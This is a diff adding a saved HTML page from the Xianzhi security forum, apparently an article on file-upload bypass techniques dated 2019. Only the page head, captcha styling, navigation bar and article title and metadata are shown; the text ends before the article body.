@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<!-- saved from url=(0028)https://xz.aliyun.com/t/6692 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>论文件上传绕过的各种姿势 - 先知社区</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
+    <!-- Le styles -->
+    <link href="./论文件上传绕过的各种姿势 - 先知社区_files/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="./论文件上传绕过的各种姿势 - 先知社区_files/OverlayStyle.css">
+    <link rel="stylesheet" href="./论文件上传绕过的各种姿势 - 先知社区_files/editormd.min.css">
+    <link rel="stylesheet" href="./论文件上传绕过的各种姿势 - 先知社区_files/tango.css">
+    <link rel="stylesheet" href="./论文件上传绕过的各种姿势 - 先知社区_files/topic.css">
+    <link rel="stylesheet" href="./论文件上传绕过的各种姿势 - 先知社区_files/beautify.css">
+    <link href="./论文件上传绕过的各种姿势 - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
+    
+    <link rel="stylesheet" href="./论文件上传绕过的各种姿势 - 先知社区_files/editormd.css">
+    <link rel="stylesheet" href="./论文件上传绕过的各种姿势 - 先知社区_files/tango.css">
+    <link rel="stylesheet" href="./论文件上传绕过的各种姿势 - 先知社区_files/jquery.fancybox.min.css">
+
+    <!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="./论文件上传绕过的各种姿势 - 先知社区_files/jquery-2.1.3.min.js.下載"></script>
+    <!-- <![endif]-->
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/bootstrap.min.js.下載"></script>
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/xz.js.下載"></script>
+    
+    
+    
+    
+    <script type="text/javascript" charset="utf-8" src="./论文件上传绕过的各种姿势 - 先知社区_files/nc.js.下載"></script><style>@charset "utf-8";
+@font-face{font-family:'nc_iconfont';src:url("//at.alicdn.com/t/font_1465353706_4784257.eot");src:url("//at.alicdn.com/t/font_1465353706_4784257.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_1465353706_4784257.woff") format('woff'),url("//at.alicdn.com/t/font_1465353706_4784257.ttf") format('truetype'),url("//at.alicdn.com/t/font_1465353706_4784257.svg#iconfont") format('svg')}@font-face{font-family:'ncpc_iconfont';src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot");src:url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.eot?#iefix") format('embedded-opentype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.woff") format('woff'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.ttf") format('truetype'),url("//at.alicdn.com/t/font_384029_rhzpmteb25oecdi.svg#ncpc_iconfont") format('svg')}.nc-container div#nc-loading-circle{background:transparent;width:20px;height:20px;display:inline-block;position:relative;vertical-align:middle}.nc-container div#nc-loading-circle .sk-circle{background:transparent;width:100%;height:100%;position:absolute;left:0;top:0}.nc-container #nc-loading-circle .sk-circle:before{content:'';display:block;margin:0 auto;width:15%;height:15%;background-color:#818181;border-radius:100%;-webkit-animation:sk-circleFadeDelay 1.2s infinite ease-in-out both;animation:sk-circleFadeDelay 1.2s infinite ease-in-out both}.nc-container #nc-loading-circle .sk-circle2{-webkit-transform:rotate(30deg);-ms-transform:rotate(30deg);transform:rotate(30deg)}.nc-container #nc-loading-circle .sk-circle3{-webkit-transform:rotate(60deg);-ms-transform:rotate(60deg);transform:rotate(60deg)}.nc-container #nc-loading-circle .sk-circle4{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.nc-container #nc-loading-circle .sk-circle5{-webkit-transform:rotate(120deg);-ms-transform:rotate(120deg);transform:rotate(120deg)}.nc-container #nc-loading-circle .sk-circle6{-webkit-transform:rotate(150deg);-ms-transform:rotate(150deg);transform:rotate(150deg)}.nc-container #nc-loading-circle .sk-circle7{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.nc-container #nc-loading-circle .sk-circle8{-webkit-transform:rotate(210deg);-ms-transform:rotate(210deg);transform:rotate(210deg)}.nc-container #nc-loading-circle .sk-circle9{-webkit-transform:rotate(240deg);-ms-transform:rotate(240deg);transform:rotate(240deg)}.nc-container #nc-loading-circle .sk-circle10{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg)}.nc-container #nc-loading-circle .sk-circle11{-webkit-transform:rotate(300deg);-ms-transform:rotate(300deg);transform:rotate(300deg)}.nc-container #nc-loading-circle .sk-circle12{-webkit-transform:rotate(330deg);-ms-transform:rotate(330deg);transform:rotate(330deg)}.nc-container #nc-loading-circle .sk-circle2:before{-webkit-animation-delay:-1.1s;animation-delay:-1.1s}.nc-container #nc-loading-circle .sk-circle3:before{-webkit-animation-delay:-1s;animation-delay:-1s}.nc-container #nc-loading-circle .sk-circle4:before{-webkit-animation-delay:-.9s;animation-delay:-.9s}.nc-container #nc-loading-circle .sk-circle5:before{-webkit-animation-delay:-.8s;animation-delay:-.8s}.nc-container #nc-loading-circle .sk-circle6:before{-webkit-animation-delay:-.7s;animation-delay:-.7s}.nc-container #nc-loading-circle .sk-circle7:before{-webkit-animation-delay:-.6s;animation-delay:-.6s}.nc-container #nc-loading-circle .sk-circle8:before{-webkit-animation-delay:-.5s;animation-delay:-.5s}.nc-container #nc-loading-circle .sk-circle9:before{-webkit-animation-delay:-.4s;animation-delay:-.4s}.nc-container #nc-loading-circle .sk-circle10:before{-webkit-animation-delay:-.3s;animation-delay:-.3s}.nc-container #nc-loading-circle .sk-circle11:before{-webkit-animation-delay:-.2s;animation-delay:-.2s}.nc-container #nc-loading-circle .sk-circle12:before{-webkit-animation-delay:-.1s;animation-delay:-.1s}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@-webkit-keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}@keyframes sk-circleFadeDelay{0%,39%,100%{opacity:0}40%{opacity:1}}.nc-container .scale_text2 #nc-loading-circle .sk-circle:before{background-color:#fff}.nc_iconfont{font-family:"nc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.ncpc_iconfont{font-family:"ncpc_iconfont";color:#ff3f08;font-size:16px;font-style:normal}.captcha-error .icon_ban{float:left;font-size:16px;padding-right:5px;line-height:14px}.clickCaptcha_text .btn_refresh{font-style:normal;cursor:pointer;background:#fff;color:#737383}.imgCaptcha .btn_refresh{font-size:20px;cursor:pointer;background:#fff;color:#737383}.nc_voice{display:none;position:relative;margin-top:-34px;z-index:99;width:auto;height:34px;background:#fff}.omeo-code-img,.omeo-code-audio{font-size:0;text-align:left}.omeo-code-audiobox,.omeo-code-img a,.omeo-code-audio a,.omeo-code-state{display:inline-block;*display:inline;zoom:1;height:32px;vertical-align:top;font-size:12px}.omeo-code .omeo-code-refresh{background:transparent;width:32px;height:32px;font-size:20px;color:#888;text-align:center;text-decoration:none;padding-left:4px;line-height:32px}.omeo-code .omeo-switch{display:none;width:32px;height:32px;border-left:1px solid #e1e1e1;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat}.omeo-img-active .omeo-code-img{display:block}.omeo-img-active .omeo-code-audio{display:none}.omeo-code-img img{border:1px solid #cdcdcd;cursor:pointer}.omeo-code-img .omeo-switch{background-position:9px -41px}.omeo-audio-active .omeo-code-audio{display:block}.omeo-audio-active .omeo-code-img{display:none}.omeo-code-refresh{position:relative;left:95px}.omeo-code-audiobox{position:relative;height:30px;line-height:32px;border:1px solid #e1e1e1;text-align:center;overflow:hidden;left:100px;top:1px;width:45%;min-width:80px;background-color:#eee}.omeo-code-audiobox a{display:block;text-decoration:none;color:#06c}.omeo-code-audiobox-playing a{visibility:hidden}.omeo-code-audiobox span,.omeo-code-audiobox b{visibility:hidden;position:absolute;top:0;left:0;height:30px;font-weight:100;overflow:hidden}.omeo-code-audiobox-playing span,.omeo-code-audiobox-playing b{visibility:visible}.omeo-code-audiobox span{z-index:0;width:0;background:#186bca}.omeo-code-audiobox b{width:100%;z-index:1;text-align:left;text-indent:30px;color:#999;background:url("//g.alicdn.com/sd/ncpc/images/checkcode.png") no-repeat 14px -89px}.omeo-code-audio .omeo-switch{background-position:5px 10px}input[type=text]::-ms-clear{display:none}.omeo-box{position:relative;background-color:#fff}.omeo-code-echo{position:absolute;top:2px;left:2px}.omeo-code-echo input{padding:5px;height:18px;line-height:18px;border:1px solid #ddd;width:80px;outline:0}.omeo-code-state{height:30px;line-height:30px;text-indent:25px;white-space:nowrap;background-image:url("//g.alicdn.com/sd/ncpc/images/checkcode.png");background-repeat:no-repeat;background-position:100px 100px}.omeo-code-echo .omeo-code-state-error{width:auto;background-position:7px -193px}.omeo-code-echo .omeo-code-state-success{position:absolute;width:30px;background-position:7px -243px}.omeo-code-state{position:absolute;left:0;top:28px}.nc_voice_close{display:inline-block;position:relative;cursor:pointer;left:95px;top:0;border-left:#ddd 2px solid;padding:0 0 0 7px;background-color:#fff;font-size:20px;color:#888;line-height:32px}.nc_help{position:absolute;width:100%;height:100%;left:0;top:0;z-index:99999}.nc_help .mask{background-color:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%;top:0;left:0}.nc_btn_close{position:absolute;height:20px;left:500px;border-radius:20px;padding:10px 30px;background-color:#aaa;color:#fff;cursor:pointer;z-index:10}.nc_btn_close:hover{background-color:#afafaf}.nc_hand{position:absolute;width:68px;height:53px;background-image:url("//g.alicdn.com/sd/ncpc/images/hand.png");z-index:3}.nc_slide_bg{z-index:3;font-size:12px;text-align:center;color:#fff;line-height:34px}.nc_voicebtn{position:absolute;padding:0;right:-25px;font-size:23px;color:#888;cursor:pointer;line-height:34px}.nc_helpbtn{position:absolute;cursor:pointer;right:-95px;top:4px;font-size:12px;background-color:#ffb668;color:#fff;padding:4px;border-radius:2px;line-height:18px;display:none}.nc_helpbtn:before{width:0;height:0;content:"";position:absolute;left:-2px;top:6px;border-top:4px solid transparent;border-bottom:4px solid transparent;border-right:4px solid #ffb668}.nc-container .errloading{border:#faf1d5 1px solid;text-indent:3px;background-image:none;font-size:12px;width:290px;line-height:20px;padding:7px 5px 8px 5px;color:#ef9f06;}.nc-container .errloading a{color:#30a7fc}.nc_captcha_text .nc_err{float:left;text-indent:0}.button_move{transition:left .5s;-moz-transition:left .5s;-webkit-transition:left .5s;-o-transition:left .5s}.bg_move{transition:width .5s;-moz-transition:width .5s;-webkit-transition:width .5s;-o-transition:width .5s}.nc_slide_box{position:absolute}.nc_captcha_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal}.nc-container .nc_captcha_img_text{width:auto;height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 0;background-position:0 0;}.nc-container .nc_captcha_img_text span.nc-lang-cnt{line-height:inherit}.nc-container .imgCaptcha .nc_captcha_img_text{width:auto}.nc_captcha_img_text{height:auto;line-height:20px;visibility:hidden;font-size:12px;color:#999;font-weight:normal;display:none;padding:0 0 10px 3px;background-position:0 0}.nc-container .nc_wrapper{width:auto}.nc_scale{width:auto;height:34px;background:#e8e8e8;position:relative;margin:0;padding:0}.nc_scale.is_audio{margin-right:25px}.nc-container .nc_scale div{height:auto}.nc-container .nc_scale ul{list-style:none}.nc-container .nc_scale .btn_slide{color:#737383;background-image:none;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.nc-container .nc_scale span{text-align:center;width:40px;height:32px;line-height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff;z-index:2}.nc-container .nc_scale span.nc-lang-cnt{*line-height:34px;float:none;width:auto;height:auto;*height:34px;border:none;position:static;cursor:inherit;background:none;z-index:0;display:inline}.nc_slide_button{width:40px;height:32px;border:1px solid #ccc;position:absolute;left:0;cursor:move;background:#fff url("//g.alicdn.com/sd/ncpc/images/rt.png") no-repeat center;z-index:2}@media screen and (-ms-high-contrast:active),(-ms-high-contrast:none){.nc_scale span{height:32px}}.nc-container .nc_scale .btnok{cursor:default;background:#fff url("//g.alicdn.com/sd/ncpc/images/yes.png") no-repeat center;z-index:3}.nc-container .nc_scale .btnok2{cursor:default;font-size:20px;background:#fff url("//g.alicdn.com/sd/ncpc/images/no.png") no-repeat center;z-index:3}.nc-container .nc_scale .btn_warn{cursor:default;color:#ff3f08;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3}.nc-container .clickCaptcha_text .btn_refresh{font-size:20px}.nc-container .clickCaptcha_text .icon_close{line-height:30px;margin-left:8px;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:2px;background:transparent;z-index:3}.nc-container .nc_captcha_img_text .icon_close{cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:4px;background:transparent;z-index:3;line-height:18px}.nc-container .errloading .icon_warn{cursor:default;color:#ff3f08;font-size:18px;float:left;background:transparent;z-index:3}.nc-container .nc_scale .btn_ok{cursor:default;line-height:34px;text-align:center;font-size:20px;background:#fff;z-index:3;color:#76c61d}.nc-container .nc_scale .nc_ok,.nc-container .nc_scale .nc_bg{background:#7ac23c}.nc-container .nc_scale .nc_bg{position:absolute;height:100%;_height:34px;left:0;width:10px}.nc-container .nc_scale div.redbar{background:#fc461e;opacity:.5;filter:alpha(opacity=50)}.nc-container .nc_scale div.orange{background:#f00}.nc-container .nc_scale .scale_text{width:100%;height:100%;text-align:center;position:absolute;z-index:1;background:transparent;color:#9c9c9c;line-height:34px;font-size:12px;cursor:pointer}.nc-container .nc_scale .scale_text2{text-align:left;color:#fff;font-size:12px;text-indent:10px}.nc-container .nc_scale .scale_text2 b{padding-left:0;font-weight:normal}.nc-container .nc_scale .scale_text.scale_loading_text{text-align:center}.nc-container .nc_scale .imgCaptcha,.nc-container .nc_scale .clickCaptcha{display:none;overflow:hidden;border:1px solid #ccc;background:#fff;z-index:20000;}.nc-container .nc_scale .imgCaptcha p.error span,.nc-container .nc_scale .clickCaptcha p.error span{line-height:normal}.nc-container .nc_scale .imgCaptcha{height:auto}.nc-container .nc_scale .clickCaptcha{position:absolute;left:0;top:35px;height:270px;background:#fff;display:none;}.nc-container .nc_scale .clickCaptcha p.error i{color:#ff3f08;font-style:normal}.nc-container .nc_scale .clickCaptcha div{position:static;clear:both;width:100%;background:#fff;height:auto}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text{height:30px;line-height:30px;font-size:12px;color:#999;}.nc-container .nc_scale .clickCaptcha .clickCaptcha_text b{font-weight:normal}.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer;margin:2px 9px 0 0}.nc_iconfont.nc_btn_2{position:absolute;right:0;top:0;cursor:pointer}.nc_iconfont.nc_btn_1{position:absolute;top:10px;right:5px}.nc_btn_1{top:10px;right:10px}.scale_text i{font-style:normal;border:none;position:static;cursor:default;color:#fffc00;background:none;display:inline;width:100%}.nc-container .clickCaptcha .clickCaptcha_img{margin:0 auto;clear:both;position:relative;}.nc-container .clickCaptcha .clickCaptcha_img img{width:230px;height:230px;margin-left:10px;margin-top:5px}.nc-container .clickCaptcha .clickCaptcha_btn{margin:10px 0 0 15px;position:relative;text-align:left;}.nc-container .clickCaptcha .clickCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha{position:absolute;left:0;top:35px;height:auto;padding-bottom:15px;border:1px solid #ccc;background:#fff;}.nc-container .imgCaptcha div{position:static;width:90%;background-color:#fff}.nc-container .imgCaptcha,.nc-container .clickCaptcha{text-align:left;}.nc-container .imgCaptcha a,.nc-container .clickCaptcha a{color:#ff3f08}.nc-container .imgCaptcha .imgCaptcha_text{height:42px;line-height:42px;width:120px;background:#fff;font-size:14px;text-align:left;color:#747474;float:left;margin-left:10px;}.nc-container .imgCaptcha .imgCaptcha_text input{margin-top:5px;height:30px;line-height:30px;font-size:14px;width:90px;background:#fff}.nc-container .imgCaptcha .imgCaptcha_text input:focus{outline:none;color:#bbb}.nc-container .imgCaptcha .imgCaptcha_btn{margin:0 0 0 12px;*margin-left:0;clear:both;padding-top:5px;width:90%;}.nc-container .imgCaptcha .imgCaptcha_btn img{cursor:pointer}.nc-container .imgCaptcha .nc_scale_submit{margin:0 auto;cursor:pointer;background-color:#fc461e;width:120px;height:32px;line-height:32px;color:#fff;text-align:center}.nc-container .imgCaptcha .imgCaptcha_img{margin:4px 0 0 100px;height:40px;width:130px;overflow:hidden;cursor:pointer;}.nc-container .imgCaptcha .imgCaptcha_img img{width:130px}.nc-container .imgCaptcha .imgCaptcha_img input{border:solid 1px #ccc}.nc-lang-ar_MA,.nc-lang-ar_SA,.nc-lang-iw_HE,.nc-lang-iw_IL{text-align:right;*text-align:left;}.nc-lang-ar_MA .nc_scale .scale_text2,.nc-lang-ar_SA .nc_scale .scale_text2,.nc-lang-iw_HE .nc_scale .scale_text2,.nc-lang-iw_IL .nc_scale .scale_text2{text-align:right;}.nc-lang-ar_MA .nc_scale .scale_text2 span,.nc-lang-ar_SA .nc_scale .scale_text2 span,.nc-lang-iw_HE .nc_scale .scale_text2 span,.nc-lang-iw_IL .nc_scale .scale_text2 span{*display:inline-block;padding:0 56px 0 0}.nc-lang-ar_MA .nc_captcha_img_text,.nc-lang-ar_SA .nc_captcha_img_text,.nc-lang-iw_HE .nc_captcha_img_text,.nc-lang-iw_IL .nc_captcha_img_text{*text-align:right}.nc-lang-ar_MA span.nc-lang-cnt,.nc-lang-ar_SA span.nc-lang-cnt,.nc-lang-iw_HE span.nc-lang-cnt,.nc-lang-iw_IL span.nc-lang-cnt{text-align:right;direction:rtl}.nocaptcha span.nc-lang-cnt{float:none;height:auto;line-height:30px}.nc-container{font-size:12px;-ms-touch-action:none;touch-action:none;}.nc-container p{margin:0;padding:0;display:inline}.nc-container .scale_text.scale_text span[data-nc-lang="_startTEXT"]{display:inline-block;width:100%}.nc-container .scale_text.scale_text.slidetounlock span[data-nc-lang="_startTEXT"]{background:-webkit-gradient(linear,left top,right top,color-stop(0,#4d4d4d),color-stop(.4,#4d4d4d),color-stop(.5,#fff),color-stop(.6,#4d4d4d),color-stop(1,#4d4d4d));-webkit-background-clip:text;-webkit-text-fill-color:transparent;-webkit-animation:slidetounlock 3s infinite;-webkit-text-size-adjust:none}.nc-container .nc_scale .nc-align-center.scale_text2{text-align:center;text-indent:-42px}@-webkit-keyframes slidetounlock{0%{background-position:-200px 0}100%{background-position:200px 0}}.nc-container.tb-login .clickCaptcha_text .icon_close{line-height:30px;margin-left:0;cursor:default;color:#ff3f08;font-size:16px;float:left;margin-right:0;background:transparent;z-index:3}.nc-container.tb-login{position:relative;margin-top:20px;display:none;}.nc-container.tb-login .nc_scale{width:auto;}.nc-container.tb-login .nc_scale .scale_text2{text-indent:-42px;text-align:center;}.nc-container.tb-login .nc_scale .scale_text2 b{padding:0}.nc-container.tb-login .nc_scale.nc_err div.scale_text{background:#f79977}.nc-container.tb-login .errloading{width:auto}.nc-container.tb-login .imgCaptcha,.nc-container.tb-login .clickCaptcha{width:252px;*width:256px;border:0;*height:300px;min-height:300px;max-height:inherit !important;}.nc-container.tb-login .imgCaptcha div.login-msg.error,.nc-container.tb-login .clickCaptcha div.login-msg.error{background:#fff2f2}.nc-container.tb-login .imgCaptcha .captcha-error,.nc-container.tb-login .clickCaptcha .captcha-error{position:absolute;top:0;width:244px;height:auto;margin-bottom:15px;padding:3px;border:solid 1px #ff8e8e;line-height:18px}.nc-container.tb-login .imgCaptcha .captcha-inform,.nc-container.tb-login .clickCaptcha .captcha-inform{font-size:110%;margin-left:20px}.nc-container.tb-login .imgCaptcha{padding-top:66px;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text{width:100px;margin-left:0;}.nc-container.tb-login .imgCaptcha .imgCaptcha_text input:focus{color:#000}.nc-container.tb-login .imgCaptcha .imgCaptcha_img{width:120px;_width:100px}.nc-container.tb-login .imgCaptcha .imgCaptcha_btn{width:100%;margin-left:0}.nc-container.tb-login .imgCaptcha .nc_scale_submit{width:100%;height:36px;line-height:36px;margin-top:20px;margin-left:0;border-radius:3px;font-size:16px;font-family:Tahoma,Helvetica,Arial,sans-serif;background:#ff3f08}.nc-container.tb-login .clickCaptcha{padding-top:40px;}.nc-container.tb-login .clickCaptcha .clickCaptcha_text{text-indent:4px}.nc-container.tb-login .clickCaptcha .clickCaptcha_img img{margin-left:10px}.nc-container.tb-login .nc_btn_1{top:77px;_top:57px}.nc-container.tb-login .nc_btn_2{top:36px}.login .nc-container.tb-login .login-msg p,.login-box .nc-container.tb-login .login-msg p{width:auto;float:left}.nc-container.tb-login.nc-old-login{margin:20px 0 10px 0;width:250px;}.nc-container.tb-login.nc-old-login .nc_wrapper{width:250px}.nc-container.tb-login.nc-old-login .imgCaptcha,.nc-container.tb-login.nc-old-login .clickCaptcha{width:250px;min-height:auto;}.nc-container.tb-login.nc-old-login .imgCaptcha .captcha-error,.nc-container.tb-login.nc-old-login .clickCaptcha .captcha-error{line-height:16px}.nc-container.tb-login.nc-old-login .clickCaptcha{padding-top:28px;}.nc-container.tb-login.nc-old-login .clickCaptcha .clickCaptcha_img img{width:200px;height:200px}.nc-container.nc-old-login.show-click-captcha{padding-bottom:60px}.nc-container.nc-old-login.show-click-captcha.nc-tm-min-fix{padding-bottom:40px}.nc-container.tb-login.nc-tm-min-fix .clickCaptcha{max-height:340px !important}#content .login-box .bd .nc-container.tb-login .login-msg{margin:10px auto 15px auto}#content .login-box .bd .nc-container.tb-login.nc-old-login.show-click-captcha .login-msg{margin:2px 0 0 0}.nc-container .nc_scale .nc-cc{display:none;position:absolute;left:0;top:35px;z-index:20000;width:360px;height:570px;border:1px solid #5eaef1;border-radius:4px;background:#fff;font-size:14px;line-height:18px;color:#333;}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn{background-color:#90c1eb}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-btn,.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{cursor:default}.nc-container .nc_scale .nc-cc.nc-cc-status-loading .nc-cc-refresh,.nc-container .nc_scale .nc-cc.nc-cc-status-verifing .nc-cc-refresh{color:#999}.nc-container .nc_scale .nc-cc a{color:#3199f4;text-decoration:none}.nc-container .nc_scale .nc-cc .nc_iconfont{vertical-align:top;margin-right:8px}.nc-container .nc_scale .nc-cc-btn{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;width:100px;line-height:30px;text-align:center;background-color:#3199f4;color:#fff;border-radius:4px;cursor:pointer;}.nc-container .nc_scale .nc-cc-btn.nc-cc-disabled{background-color:#90c1eb;cursor:default}.nc-container .nc_scale .nc-cc-btn .nc-lang-cnt{line-height:18px}.nc-container .nc_scale .nc-cc-header{padding:20px 20px 19px 20px;height:100px;background:#f4f8fa;border-bottom:1px solid #ccc}.nc-container .nc_scale .nc-cc-img1-box{float:left;width:100px;height:100px;margin-right:16px}.nc-container .nc_scale .nc-cc-txt{overflow:hidden;*zoom:1;line-height:30px;padding-top:11px}.nc-container .nc_scale .nc-cc-img2-box{position:relative;padding:0 20px;margin-top:20px}.nc-container .nc_scale .nc-cc-items{position:absolute;left:20px;_left:0;top:0;width:320px;overflow:hidden}.nc-container .nc_scale .nc-cc-items-inner{margin-right:-20px}.nc-container .nc_scale .nc-cc-item{position:relative;display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;margin-right:10px;margin-bottom:10px;border:1px solid #ccc;width:98px;height:98px;background:url("//gtms02.alicdn.com/tps/i2/T1ty2QFNNXXXc6Yc2r-1-1.gif");}.nc-container .nc_scale .nc-cc-item:hover{border-color:#3199f4}.nc-container .nc_scale .nc-cc-item .nc_iconfont{display:none;position:absolute;right:0;bottom:0;color:#3199f4;font-size:22px;margin-right:0}.nc-container .nc_scale .nc-cc-item.nc-cc-selected .nc_iconfont{display:block}.nc-container .nc_scale .nc-cc-tip{display:none;position:absolute;left:0;bottom:60px;width:360px;line-height:18px;text-align:center;color:#eb4f38;}.nc-container .nc_scale .nc-cc-tip span{line-height:normal}.nc-container .nc_scale .nc-cc-footer{position:absolute;left:0;bottom:20px;width:360px;height:30px;line-height:30px;text-align:center;}.nc-container .nc_scale .nc-cc-footer .nc_iconfont{color:#c4cbd0}.nc-container .nc_scale .nc-cc-refresh,.nc-container .nc_scale .nc-cc-wait{position:absolute;left:20px;top:0;color:#3199f4;cursor:pointer}.nc-container .nc_scale .nc-cc-wait{display:none}.nc-container .nc_scale .nc-cc-cancel{position:absolute;right:20px;top:0;color:#3199f4;cursor:pointer;}.nc-container .nc_scale .nc-cc-cancel .nc_iconfont{position:relative;top:-1px}.nc-container .nc_scale .nc-cc-loading{margin-top:247px;text-align:center;line-height:14px}.nc-container .nc_scale .nc-cc-loading-img{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;vertical-align:middle;background:url("//img.alicdn.com/tps/TB1OdxsKpXXXXcgXFXXXXXXXXXX-14-14.gif") no-repeat;width:14px;height:14px;position:relative;top:-1px;margin-right:9px}.nc-container .nc_scale .nc-cc-fail{position:absolute;left:50%;top:50%;width:320px;height:180px;margin-left:-160px;margin-top:-90px;background:#fff;border-radius:4px}.nc-container .nc_scale .nc-cc-fail-inner{text-align:center;padding:55px 10px 10px}.nc-container .nc_scale .nc-cc-fail-action{margin:28px 0 18px;}.nc-container .nc_scale .nc-cc-fail-action a{display:inline-block;*display:inline;*zoom:1;vertical-align:top;letter-spacing:normal;word-spacing:normal;line-height:30px;margin-left:16px}.nc-container .nc_scale .nc-cc-contact{text-align:right;color:#666;padding-right:9px}.nc-container .nc_scale .nc-cc-mask{display:none;position:absolute;left:0;top:0;width:360px;height:570px;background:rgba(0,0,0,0.3);filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#4C000000', endColorstr='#4C000000');}:root .nc-container .nc_scale .nc-cc-mask{-webkit-filter:none;filter:none}.nc-container .nc_scale .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-arrow-2{display:none;position:absolute;top:340px;border:solid transparent;height:0;width:0}.nc-container .nc_scale .nc-cc-arrow-1{border-width:16px;margin-top:-1px}.nc-container .nc_scale .nc-cc-arrow-2{border-width:15px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1,.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2,.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{display:block;_display:none}.nc-container .nc_scale .nc-cc-right{left:180px;top:-339px;}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-1{border-right-color:#5eaef1;left:-32px}.nc-container .nc_scale .nc-cc-right .nc-cc-arrow-2{border-right-color:#fff;left:-30px}.nc-container .nc_scale .nc-cc-left{left:-335px;top:-339px;}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-1{border-left-color:#5eaef1;right:-32px}.nc-container .nc_scale .nc-cc-left .nc-cc-arrow-2{border-left-color:#fff;right:-30px}</style>
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/editormd.min.js.下載"></script>
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/jquery.fancybox.min.js.下載"></script>
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/modal.min.js.下載"></script>
+
+
+</head>
+<body class="">
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="https://xz.aliyun.com/"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F6692&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
+                    登录</a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1">
+                    <form method="get" action="https://xz.aliyun.com/search">
+                        <input type="text" placeholder="搜索" name="keyword">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/jquery.toc.min.js.下載"></script>
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/toc.min.js.下載"></script>
+    <script src="./论文件上传绕过的各种姿势 - 先知社区_files/dt.js.下載"></script>
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">论文件上传绕过的各种姿势</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/24416">
+                        <span class="username cell"> 未完成的歌</span></a> <span class="i-seprator"> / </span>
+                    <span> 2019-11-07 09:19:25</span><span class="i-seprator"> / </span>
+                    <span>浏览数 10769</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
